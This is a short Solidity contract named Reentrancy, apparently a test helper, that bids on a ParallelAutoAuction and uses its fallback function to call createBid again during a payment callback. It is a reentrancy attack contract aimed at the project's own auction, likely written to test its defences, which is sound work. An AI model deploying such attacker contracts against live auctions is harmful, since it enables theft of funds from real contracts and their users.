// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "../ParallelAutoAuction.sol";

contract Reentrancy {
    
    ParallelAutoAuction auction;
    uint8 i;
    uint24 id;

    constructor(address _auction) {
        auction = ParallelAutoAuction(_auction);
    }
    
    function hack(uint24 _id) public payable {
        id = _id;
        auction.createBid{value: msg.value}(id);
    }

    receive() external payable { }

    fallback() payable external {
        i++;
        if (i < 10) return;
        auction.createBid{value: auction.getMinPriceFor(i)}(id);
    }
    
}

